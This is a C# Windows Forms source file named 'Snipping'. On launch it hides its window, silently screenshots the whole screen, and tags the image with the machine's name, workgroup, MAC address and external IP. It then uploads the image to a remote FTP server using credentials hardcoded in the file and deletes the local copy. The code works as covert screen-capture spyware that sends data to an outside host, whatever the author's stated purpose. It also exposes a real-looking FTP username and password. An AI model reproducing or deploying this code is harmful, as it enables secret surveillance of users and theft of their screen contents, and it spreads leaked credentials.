using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Management;
using System.Diagnostics;
using System.Threading;
using System.Windows;
using System.Collections;
using System.Runtime.InteropServices;
using System.Timers;
using System.Text.RegularExpressions;

namespace Snipping
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        int a= Screen.PrimaryScreen.Bounds.Width;
        int b= Screen.PrimaryScreen.Bounds.Height;
        static string pcadi;
        static string work;
        static string path2;
        static string MAC;
        static string imgName;
        static string prgName = Application.ProductName;
        static string errorLine;
        static string IP;
        static string ftpUser = "enesvekadir";
        static string ftpPass = "enes++52";
        static string ftpDizin = "ftp://ftp.enesvekadir.com/public_html/Snip/img/";
        static string date = String.Format("{0:dd/MM/yyyy}", System.DateTime.Now).ToString();
        static Bitmap Screenshot;
        static string winDir;
        static char winDirShortVersion;
        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
              
                winDir = Convert.ToString(Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.System)));
                winDirShortVersion = winDir.FirstOrDefault();

                pcadi = SystemInformation.ComputerName;
                pcadi = pcadi.Replace("Ç", "C");
                pcadi = pcadi.Replace("Ü", "U");
                pcadi = pcadi.Replace("İ", "I");
                pcadi = pcadi.Replace("Ö", "O");
                pcadi = pcadi.Replace("Ş", "S");
                pcadi = pcadi.Replace(" ", "_");
                pcadi = pcadi.Replace("ç", "c");
                pcadi = pcadi.Replace("ü", "u");
                pcadi = pcadi.Replace("ı", "i");
                pcadi = pcadi.Replace("ö", "o");
                pcadi = pcadi.Replace("ş", "s");
                IP = IPAd();
                MAC = Mac();
                if (String.IsNullOrEmpty(MAC))
                {

                }

                MAC = MAC.Replace(":", "_");
                ManagementObjectSearcher mos =
                   new ManagementObjectSearcher(@"root\CIMV2", @"SELECT * FROM Win32_ComputerSystem");
                foreach (ManagementObject mo in mos.Get())
                {

                    work = mo["Workgroup"].ToString();

                }

                imgName = "snapshot" + "__+" + pcadi + "+__+" + work + "+__+" + MAC + "+__+" + date.Replace(":", "_") + "+__+" + DateTime.Now.ToShortTimeString().Replace(":", "_") + "+.jpg";
                this.Width = a;
                this.Height = b;
                this.CenterToScreen();
                this.Visible = false;
                string path = Application.StartupPath.Replace(@"\", "/") + "/";
                path = path + imgName;
                path2 = path;
                Snapshot().Save(path2);
                string uploadpath = path2;
                string file = imgName;
                      // FTP ile Dosya Yükleme
                      using (WebClient client = new WebClient())
                      {
                          client.Credentials = new NetworkCredential(ftpUser, ftpPass);
                          client.UploadFile(ftpDizin + file, "STOR", uploadpath);
                      }
                      // FTP ile Dosya Yükleme
                File.Delete(imgName);
                Application.Exit();
            }
            catch (Exception Exc)
            {
                errorLine = "IP: " + IP + Environment.NewLine + "MAC: " + MAC + Environment.NewLine + "WORKGROUP: " + work + Environment.NewLine
                    + "PC: " + pcadi + Environment.NewLine + "Hata: " + Exc.Message + Environment.NewLine + "Program: " + prgName + Environment.NewLine
                    + "Tarih: " + DateTime.Now.ToString() + Environment.NewLine + "------------------------------------" + Environment.NewLine;
                string file_path = @winDirShortVersion + @":\n0kayip\Logs\error_log.txt";
             //   Process.Start(@winDirShortVersion + @":\n0kayip\GPS.exe");
                System.IO.File.AppendAllText(file_path, errorLine);
                Application.Exit();
            }

        }
        public static string IPAd()
        {
            string externalIP = "";
            externalIP = (new WebClient()).DownloadString("http://checkip.dyndns.org/");
            externalIP = (new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")).Matches(externalIP)[0].ToString();
            return externalIP;
        }
        private static string Mac()
        {
            try
            {
                ManagementClass manager = new ManagementClass("Win32_NetworkAdapterConfiguration");
                foreach (ManagementObject obj in manager.GetInstances())
                {
                    if ((bool)obj["IPEnabled"])
                    {
                        return obj["MacAddress"].ToString();
                    }
                }
                
            }
            catch (Exception Exc)
            {
                errorLine = "IP: " + IP + Environment.NewLine + "MAC: " + MAC + Environment.NewLine + "WORKGROUP: " + work + Environment.NewLine
                     + "PC: " + pcadi + Environment.NewLine + "Hata: " + Exc.Message + Environment.NewLine + "Program: " + prgName + Environment.NewLine
                     + "Tarih: " + DateTime.Now.ToString() + Environment.NewLine + "------------------------------------" + Environment.NewLine;
                string file_path = @winDirShortVersion + @":\n0kayip\Logs\error_log.txt";
              //  Process.Start(@winDirShortVersion + @":\n0kayip\GPS.exe");
                System.IO.File.AppendAllText(file_path, errorLine);
                Application.Exit();
            }
            return String.Empty;
        }

        private Bitmap Snapshot()
        {
                this.Size = new Size(a, b);

                // bitmap nesnesi oluştur
                Bitmap Screenshot = new Bitmap(this.Width, this.Height);

                // bitmapten grafik nesnesi oluştur
                Graphics GFX = Graphics.FromImage(Screenshot);

                // ekrandan programın bulunduğu konumun resmini alalım
                GFX.CopyFromScreen(this.Left, this.Top, 0, 0, this.Size);
             
            return Screenshot;
        }
        
    }
}
